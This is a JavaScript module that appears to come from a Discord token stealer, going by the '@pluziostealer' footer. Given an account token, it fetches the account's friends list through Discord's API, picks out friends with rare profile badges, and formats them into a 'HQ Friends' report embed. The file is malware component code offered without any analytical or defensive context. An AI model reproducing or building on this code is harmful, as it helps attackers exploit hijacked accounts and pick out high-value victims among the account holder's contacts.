const axios = require('axios');

function GetBadges(flags) { 
    const Discord_Employee = 1; const Partnered_Server_Owner = 2; const HypeSquad_Events = 4; const Bug_Hunter_Level_1 = 8; const Early_Supporter = 512; const Bug_Hunter_Level_2 = 16384; const Early_Verified_Bot_Developer = 131072; const Active_Developer = 4194304;
    var badges = "";
    
    if ((flags & Discord_Employee) == Discord_Employee) { badges += "<:staff:874750808728666152> "  }
    if ((flags & Partnered_Server_Owner) == Partnered_Server_Owner) { badges += "<:partner:874750808678354964> " }
    if ((flags & HypeSquad_Events) == HypeSquad_Events) { badges += "<:hypesquad_events:874750808594477056> " }
    if ((flags & Bug_Hunter_Level_1) == Bug_Hunter_Level_1) { badges += "<:bughunter_1:874750808426692658> " }
    if ((flags & Early_Supporter) == Early_Supporter) { badges += "<:early_supporter:874750808414113823> " }
    if ((flags & Bug_Hunter_Level_2) == Bug_Hunter_Level_2) { badges += "<:bughunter_2:874750808430874664> " }
    if ((flags & Early_Verified_Bot_Developer) == Early_Verified_Bot_Developer) { badges += "<:developer:874750808472825986> " }
    if ((flags & Active_Developer) == Active_Developer) { badges += "<:activedev:1077552129335636069> " }
    if (badges == "") { badges = "" }
    
    return badges
}

exports.get = async (token, results) => {

    let friends = await axios("https://discord.com/api/v9/users/@me/relationships", { headers: { "Authorization": token, 'Content-Type': 'application/x-www-form-urlencoded', 'Accept-Encoding': '*'  } })
    let friends_data = friends.data

    const r = friends_data.filter((user) => { return user.type == 1 })
    var data = "";

    for (z of r) { var b = GetBadges(z.user.public_flags); if (b != "") { data += b + `| \`${z.user.username}#${z.user.discriminator}\n\`` } }
    if (data == "") { data = "*Nothing To See Here*" }
    

    let embed = { 
        "color": 0x303037, 
        "author": { 
            "name": `HQ Friends`,
            "icon_url": "https://media.discordapp.net/attachments/1076644004608884798/1077518510495907870/discord-avatar-128-D9U0P.gif?width=86&height=86"
        },
        "description": data, 
        "footer": { 
            "text": `@pluziostealer`
        } 
    }

    return embed
}